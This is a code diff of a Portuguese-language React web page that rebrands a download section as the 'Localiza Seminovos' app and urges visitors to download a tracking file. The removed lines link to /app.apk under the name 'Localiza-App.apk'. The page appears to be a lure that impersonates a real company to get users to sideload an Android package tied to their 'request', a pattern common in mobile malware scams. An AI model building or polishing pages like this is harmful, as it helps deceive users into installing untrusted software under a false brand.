@@ -81,12 +81,34 @@ export default function Home() {
 
           {/* Seção de Acompanhamento */}
           <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-lg sm:rounded-xl p-4 sm:p-6 mb-4 sm:mb-6">
-            <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 mb-3 sm:mb-4 text-center">
-              Acompanhe em Tempo Real
-            </h4>
+            <div className="flex flex-col items-center justify-center gap-3 mb-3 sm:mb-4">
+              <div className="flex-shrink-0 w-16 h-16 sm:w-20 sm:h-20 bg-green-500 rounded-xl flex items-center justify-center shadow-lg">
+                <svg 
+                  className="w-9 h-9 sm:w-11 sm:h-11 text-white" 
+                  fill="currentColor" 
+                  viewBox="0 0 20 20"
+                >
+                  <path 
+                    fillRule="evenodd" 
+                    d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4zm2 6a1 1 0 011-1h6a1 1 0 110 2H7a1 1 0 01-1-1zm1 3a1 1 0 100 2h6a1 1 0 100-2H7z" 
+                    clipRule="evenodd" 
+                  />
+                  <path 
+                    d="M10 12l-2 2m0 0l2 2m-2-2h4"
+                    strokeLinecap="round"
+                    strokeLinejoin="round"
+                    strokeWidth="2"
+                    stroke="white"
+                    fill="none"
+                  />
+                </svg>
+              </div>
+              <h4 className="text-lg sm:text-xl md:text-2xl font-bold text-gray-800 text-center">
+                Aplicativo da Localiza Seminovos
+              </h4>
+            </div>
             <p className="text-sm sm:text-base text-gray-700 text-center mb-4 sm:mb-6 leading-relaxed px-2">
-              Baixe o arquivo de acompanhamento para receber atualizações em
-              tempo real sobre o andamento da sua solicitação.
+              Baixe o aplicativo da Localiza Seminovos para acompanhar as atualizações da sua solicitação.
             </p>
 
             {/* Botão de Download Principal */}
@@ -110,47 +132,27 @@ export default function Home() {
                   />
                 </svg>
                 <span className="leading-tight">
-                  Baixar Arquivo de Acompanhamento
+                  Baixar Aplicativo de Acompanhamento
                 </span>
               </a>
             </div>
 
-            <p className="text-xs sm:text-sm text-gray-600 text-center mt-3 sm:mt-4 italic px-2">
-              O arquivo será atualizado automaticamente com novas informações
-            </p>
-          </div>
-
-          {/* Informações Importantes */}
-          <div className="bg-blue-50 border-l-4 border-blue-500 rounded-lg p-4 sm:p-6">
-            <h5 className="font-bold text-gray-800 mb-3 flex items-start sm:items-center gap-2 text-sm sm:text-base">
-              <svg
-                className="w-4 h-4 sm:w-5 sm:h-5 text-blue-500 flex-shrink-0 mt-0.5 sm:mt-0"
-                fill="currentColor"
+            <div className="mt-4 sm:mt-6 flex items-start gap-2 bg-white/60 rounded-lg p-3 sm:p-4">
+              <svg 
+                className="w-5 h-5 sm:w-6 sm:h-6 text-gray-600 flex-shrink-0 mt-0.5" 
+                fill="currentColor" 
                 viewBox="0 0 20 20"
               >
-                <path
-                  fillRule="evenodd"
-                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"
-                  clipRule="evenodd"
+                <path 
+                  fillRule="evenodd" 
+                  d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" 
+                  clipRule="evenodd" 
                 />
               </svg>
-              <span>Importante</span>
-            </h5>
-            <p className="text-gray-700 text-xs sm:text-sm mb-4 leading-relaxed">
-              Para acompanhar as atualizações desta solicitação, baixe o arquivo
-              acima. Ele contém um link seguro que será atualizado
-              automaticamente com o status e respostas.
-            </p>
-            <h5 className="font-bold text-gray-800 mb-3 text-sm sm:text-base">
-              Acompanhe em tempo real
-            </h5>
-            <a
-              href="/app.apk"
-              download="Localiza-App.apk"
-              className="inline-block bg-green-500 hover:bg-green-600 text-white font-semibold py-2.5 sm:py-3 px-5 sm:px-6 rounded-lg transition-colors duration-200 text-sm sm:text-base touch-manipulation"
-            >
-              Baixar Arquivo
-            </a>
+              <p className="text-xs sm:text-sm text-gray-700 leading-relaxed">
+                O arquivo será atualizado automaticamente com novas informações sobre o andamento da sua solicitação.
+              </p>
+            </div>
           </div>
         </div>
       </main>
